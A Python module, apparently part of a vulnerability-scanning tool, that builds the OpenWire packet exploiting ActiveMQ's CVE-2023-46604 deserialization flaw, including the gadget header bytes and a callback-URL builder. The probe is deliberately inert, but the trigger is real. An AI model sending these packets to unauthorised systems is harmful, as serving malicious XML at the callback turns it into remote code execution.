"""Curated OpenWire deserialization-RCE probe packets (REQ-AGENT-027).

Builds the exact marshalled packet that triggers ActiveMQ's OpenWire
deserialization flaw and points it at a callback URL WE host - never
agent-composed, never taking any caller-supplied bytes beyond the callback
URL itself. Each entry in GADGETS is a known-good, independently-verified
construction (this one matches nuclei's own `javascript/cves/2023/
CVE-2023-46604.yaml` template and the public reference PoC it cites,
`github.com/X1r0z/ActiveMQ-RCE`) - reusing a community-vetted byte sequence
rather than deriving OpenWire/Java-serialization wire framing from scratch.

Deliberate safety choice, NOT present in the reference implementations: this
module never constructs a payload that causes the target to spawn a
subprocess. The reference PoC's Spring XML defines a `ProcessBuilder` bean
that runs `bash -c curl ...` - real, if minimal, command execution. The
packets built here instead rely on `FileSystemXmlApplicationContext` itself
making an outbound HTTP fetch to load its constructor-argument resource -
that fetch alone, landing on our own single-use callback token, is already
unambiguous proof the deserialization gadget fired. No second-stage payload
is served back (see `worker/app/openwire_callback.py`), so there is nothing
for the target to execute even if it tried.
"""

from __future__ import annotations

import struct

# `org.springframework.context.support.FileSystemXmlApplicationContext` -
# accepts a URL as a constructor-argument resource location and fetches it
# as part of loading, which is the entire mechanism this probe relies on.
# Fixed header for ActiveMQ's OpenWire ExceptionResponse marshalling,
# byte-identical to the reference construction.
_PACKET_HEADER_HEX = (
    "00000001100000006401010100436f72672e737072696e676672616d65776f726b2e"
    "636f6e746578742e737570706f72742e46696c6553797374656d586d6c4170706c69"
    "636174696f6e436f6e74657874010"
)

GADGETS = {
    # CVE-2023-46604 (and the structurally identical older CVE-2015-5254):
    # OpenWire deserialization allows the broker to instantiate an
    # attacker-named class in the ExceptionResponse marshalling. Adding a
    # future, similarly-verified gadget is a new entry here, never a new
    # tool, transport, or approval path (REQ-AGENT-027).
    "spring-fsxml-cve-2023-46604": _PACKET_HEADER_HEX,
}


def build_probe_packet(callback_url: str, gadget: str = "spring-fsxml-cve-2023-46604") -> bytes:
    """The full raw bytes to send over the OpenWire TCP connection.

    `callback_url` becomes the FileSystemXmlApplicationContext constructor
    argument verbatim - no XML, no encoding beyond UTF-8, since our own
    callback endpoint always serves the same fixed, inert response
    regardless of the exact URL/token requested (unlike the reference
    template, which piggybacks a base64-encoded payload IN the URL for a
    third-party OOB server that doesn't know the payload ahead of time - we
    control our own server, so that indirection is unnecessary).
    """
    if gadget not in GADGETS:
        raise ValueError(f"openwire_payload: unknown gadget {gadget!r}")
    if not callback_url or not callback_url.startswith(("http://", "https://")):
        raise ValueError("openwire_payload: callback_url must be an http(s) URL")

    header = bytes.fromhex(GADGETS[gadget] + "0")[:-1]  # drop the padding nibble added only for hex parsing
    resource_bytes = callback_url.encode("utf-8")
    if len(resource_bytes) > 0xFFFF:
        raise ValueError("openwire_payload: callback_url too long for a 2-byte length field")
    # The reference JS template concatenates hex strings with an UNPADDED
    # `(len).toString(16)` for this field, which only happens to produce a
    # byte-aligned total for length values needing an odd digit count
    # (1-15, 256-4095 chars) - for the common case (16-255 chars, which
    # covers essentially every real callback URL) it produces a stray
    # half-byte, an unresolved ambiguity in the public reference itself.
    # This uses the structurally-correct interpretation instead: OpenWire's
    # own marshalling for a UTF string field is a plain 2-byte big-endian
    # length prefix (Java DataOutputStream.writeUTF convention), which the
    # header's own trailing lone nibble is consistent with (it's the "0" that
    # starts a 4-nibble/2-byte length field, not a stray artifact) - live-
    # verified against this project's own confirmed-vulnerable benchmark
    # target (docs/requirements/raw-protocol-testing.md, REQ-AGENT-027)
    # rather than trusted from the reference text alone.
    length_prefix = struct.pack(">H", len(resource_bytes))
    return header + length_prefix + resource_bytes
